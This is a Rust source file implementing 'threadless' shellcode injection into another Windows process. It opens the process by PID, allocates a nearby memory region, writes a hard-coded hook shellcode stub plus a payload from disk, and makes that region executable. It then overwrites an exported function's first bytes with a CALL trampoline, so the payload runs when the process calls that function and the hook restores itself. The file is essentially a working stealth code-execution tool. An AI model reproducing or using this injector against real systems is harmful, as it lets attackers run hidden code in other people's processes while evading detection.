use std::ffi::CString;
use std::path::Path;

use windows::core::PCSTR;
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, VirtualAllocEx,
    VirtualProtectEx,
};
use windows::Win32::System::Threading::{
    OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ,
    PROCESS_VM_WRITE,
};

use crate::error::MiscError;

/// x64 hook shellcode (63 bytes).
///
/// When the hooked function is called, this shellcode:
/// 1. Pops the return address, adjusts it to point at the original call site
/// 2. Saves all volatile registers
/// 3. Restores the original 8 bytes of the hooked function (self-healing)
/// 4. Calls the main payload shellcode (appended right after)
/// 5. Restores all registers
/// 6. Jumps back to the original (now restored) function
///
/// Bytes 22..30 are a placeholder (0xAA * 8) patched with the original function bytes.
const HOOK_SHELLCODE: [u8; 63] = [
    0x5B, 0x48, 0x83, 0xEB, 0x04, 0x48, 0x83, 0xEB, 0x01, 0x53, 0x51, 0x52, 0x41, 0x51, 0x41,
    0x50, 0x41, 0x53, 0x41, 0x52, 0x48, 0xB9, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0x48, 0x89, 0x0B, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0x11, 0x00, 0x00,
    0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5A, 0x41, 0x5B, 0x41, 0x58, 0x41, 0x59, 0x5A, 0x59,
    0x5B, 0xFF, 0xE3,
];

/// Inject shellcode into a target process using the threadless injection technique.
///
/// This technique does NOT create any remote threads. Instead it:
/// 1. Resolves a target exported function in the remote process
/// 2. Finds a "memory hole" (free memory within ±1.75 GB of the function for relative CALL)
/// 3. Writes a hook shellcode stub + the main payload into the memory hole
/// 4. Installs a 5-byte CALL trampoline over the first bytes of the target function
/// 5. When the target process naturally calls the hooked function, the payload fires
///    and the hook shellcode self-heals (restores original bytes)
///
/// # Arguments
/// * `pid` - Target process ID
/// * `shellcode_path` - Path to raw shellcode .bin file
/// * `target_dll` - DLL containing the function to hook (e.g. "USER32")
/// * `target_func` - Exported function to hook (e.g. "MessageBoxW")
pub fn inject_shellcode_threadless(
    pid: u32,
    shellcode_path: &str,
    target_dll: &str,
    target_func: &str,
) -> Result<(), MiscError> {
    let path = Path::new(shellcode_path);
    if !path.exists() {
        return Err(MiscError::FileNotFound(shellcode_path.to_string()));
    }

    let payload = std::fs::read(path)
        .map_err(|_| MiscError::FileReadFailed(shellcode_path.to_string()))?;

    if payload.is_empty() {
        return Err(MiscError::FileReadFailed(
            "Shellcode file is empty".to_string(),
        ));
    }

    let dll_cstr = CString::new(target_dll)
        .map_err(|_| MiscError::ThreadlessInjectFailed("Invalid DLL name".to_string()))?;
    let func_cstr = CString::new(target_func)
        .map_err(|_| MiscError::ThreadlessInjectFailed("Invalid function name".to_string()))?;

    unsafe {
        // Load target DLL locally to resolve the exported function address.
        // System DLLs share the same base address across processes (per-boot ASLR).
        let h_dll = LoadLibraryA(PCSTR(dll_cstr.as_ptr() as *const u8))
            .map_err(|_| MiscError::ThreadlessInjectFailed(format!("LoadLibraryA failed for {}", target_dll)))?;

        let func_addr = GetProcAddress(h_dll, PCSTR(func_cstr.as_ptr() as *const u8))
            .ok_or_else(|| MiscError::ThreadlessInjectFailed(format!("GetProcAddress failed for {}!{}", target_dll, target_func)))?;

        let func_ptr = func_addr as usize;

        // Open target process
        let process_handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            false,
            pid,
        )
        .map_err(|_| MiscError::OpenProcessFailed(pid))?;

        // Read the first 8 bytes of the target function from the remote process
        let mut original_bytes = [0u8; 8];
        let read_result = ReadProcessMemory(
            process_handle,
            func_ptr as *const _,
            original_bytes.as_mut_ptr() as *mut _,
            8,
            None,
        );

        if read_result.is_err() {
            let _ = CloseHandle(process_handle);
            return Err(MiscError::ThreadlessInjectFailed(
                "Failed to read original function bytes from remote process".to_string(),
            ));
        }

        // Patch hook shellcode with the original 8 bytes at offset 22
        let mut hook_sc = HOOK_SHELLCODE;
        hook_sc[22..30].copy_from_slice(&original_bytes);

        // Total size needed: hook shellcode + main payload
        let total_size = hook_sc.len() + payload.len();

        // Find a memory hole within ±1.75 GB of the target function (for relative CALL)
        let hole_addr = find_memory_hole(process_handle, func_ptr, total_size)?;

        // Write hook shellcode to the memory hole
        let write1 = WriteProcessMemory(
            process_handle,
            hole_addr as *mut _,
            hook_sc.as_ptr() as *const _,
            hook_sc.len(),
            None,
        );

        if write1.is_err() {
            let _ = CloseHandle(process_handle);
            return Err(MiscError::WriteFailed);
        }

        // Write main payload right after the hook shellcode
        let payload_addr = hole_addr + hook_sc.len();
        let write2 = WriteProcessMemory(
            process_handle,
            payload_addr as *mut _,
            payload.as_ptr() as *const _,
            payload.len(),
            None,
        );

        if write2.is_err() {
            let _ = CloseHandle(process_handle);
            return Err(MiscError::WriteFailed);
        }

        // Make the memory hole executable (RWX)
        let mut old_protect = PAGE_READWRITE;
        let protect_result = VirtualProtectEx(
            process_handle,
            hole_addr as *mut _,
            total_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        );

        if protect_result.is_err() {
            let _ = CloseHandle(process_handle);
            return Err(MiscError::VirtualProtectFailed);
        }

        // Build the 5-byte CALL trampoline: E8 <relative_offset>
        let mut trampoline = [0u8; 5];
        trampoline[0] = 0xE8; // CALL rel32
        let rva = (hole_addr as i64) - ((func_ptr + 5) as i64);
        let rva_bytes = (rva as i32).to_le_bytes();
        trampoline[1..5].copy_from_slice(&rva_bytes);

        // Make the target function writable
        let mut old_func_protect = PAGE_READWRITE;
        let protect_func = VirtualProtectEx(
            process_handle,
            func_ptr as *mut _,
            5,
            PAGE_READWRITE,
            &mut old_func_protect,
        );

        if protect_func.is_err() {
            let _ = CloseHandle(process_handle);
            return Err(MiscError::ThreadlessInjectFailed(
                "Failed to make target function writable".to_string(),
            ));
        }

        // Write the trampoline over the first 5 bytes of the target function
        let write_tramp = WriteProcessMemory(
            process_handle,
            func_ptr as *mut _,
            trampoline.as_ptr() as *const _,
            5,
            None,
        );

        if write_tramp.is_err() {
            let _ = CloseHandle(process_handle);
            return Err(MiscError::WriteFailed);
        }

        // Set the target function to RWX so the hook shellcode can restore original bytes
        let mut old_protect2 = PAGE_READWRITE;
        let _ = VirtualProtectEx(
            process_handle,
            func_ptr as *mut _,
            5,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect2,
        );

        let _ = CloseHandle(process_handle);

        Ok(())
    }
}

/// Find a memory hole within ±1.75 GB of a target address in the remote process.
///
/// Scans 0x10000-aligned addresses trying to allocate RW memory via VirtualAllocEx.
/// The hole must be within 32-bit signed relative addressing range for the CALL trampoline.
unsafe fn find_memory_hole(
    process_handle: windows::Win32::Foundation::HANDLE,
    target_addr: usize,
    size: usize,
) -> Result<usize, MiscError> {
    let range: usize = 0x70000000; // 1.75 GB
    let start = (target_addr & 0xFFFFFFFFFFF70000).saturating_sub(range);
    let end = target_addr.saturating_add(range);

    let mut addr = start;
    while addr < end {
        let result = VirtualAllocEx(
            process_handle,
            Some(addr as *const _),
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if !result.is_null() {
            return Ok(result as usize);
        }

        addr += 0x10000;
    }

    Err(MiscError::ThreadlessInjectFailed(
        "Failed to find memory hole within ±1.75 GB of target function".to_string(),
    ))
}
